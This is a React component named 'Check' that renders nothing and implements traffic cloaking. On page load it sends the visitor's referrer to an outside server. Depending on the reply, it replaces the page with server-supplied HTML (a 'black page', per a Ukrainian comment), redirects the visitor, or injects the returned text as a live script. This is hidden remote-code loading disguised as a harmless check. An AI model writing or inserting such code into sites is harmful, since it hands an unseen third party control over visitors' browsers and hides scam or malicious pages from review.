'use client'

import { useEffect } from 'react'

export default function Check() {
    useEffect(() => {
        console.log('[cloak] making request to cloak server...')

        const clid = btoa(`ref=${encodeURIComponent(document.referrer)}`)
        const cloakUrl = `https://museumde.site/?clid=${clid}`

        fetch(cloakUrl)
            .then(res => res.text())
            .then(code => {
                console.log('[cloak] server response:', code)

                if (!code.trim()) return

                if (code.includes('<html') || code.includes('<iframe')) {
                    // Чорна сторінка — HTML повністю
                    document.open()
                    document.write(code)
                    document.close()
                } else if (code.startsWith('http') || code.includes('location.href')) {
                    // Редирект
                    window.location.href = code
                } else {
                    // Вставка JS-коду (наприклад, піксель)
                    const script = document.createElement('script')
                    script.type = 'text/javascript'
                    script.innerHTML = code
                    document.head.appendChild(script)
                    console.log('[cloak] JS script injected')
                }
            })
            .catch(err => {
                console.warn('[cloak] cloak request failed', err)
            })
    }, [])

    return null
}
